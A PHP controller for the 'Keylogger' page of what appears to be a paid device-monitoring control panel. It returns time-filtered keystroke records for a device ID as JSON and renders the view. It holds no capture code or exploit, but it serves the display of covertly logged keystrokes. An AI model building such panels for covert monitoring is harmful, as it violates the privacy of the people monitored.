<?php

namespace Controllers;

class Keylogger extends BaseController {

    protected $module = 'keylogger';
    
    protected function init() {
        parent::init();

        $this->initCP();
    }
    
    public function indexAction() {
        $keyloggerModel = new \Models\Cp\Keylogger($this->di);
        if ($this->isAjaxRequest()) {
            $dataTableRequest = new \System\DataTableRequest();

            $dataTableRequest->getRequest($_GET, array('timeFrom', 'timeTo'));
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($keyloggerModel->getDataTableData($this->di['devId'], $dataTableRequest->getResult()));
        }

        if ($this->view->paid) {
            $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
        }
        
        $this->setView('cp/keylogger.htm');
    }
    
    protected function postAction() {
        parent::postAction();
        $this->buildCpMenu();
        
        $this->view->title = $this->di['t']->_('Keylogger');
    }

}
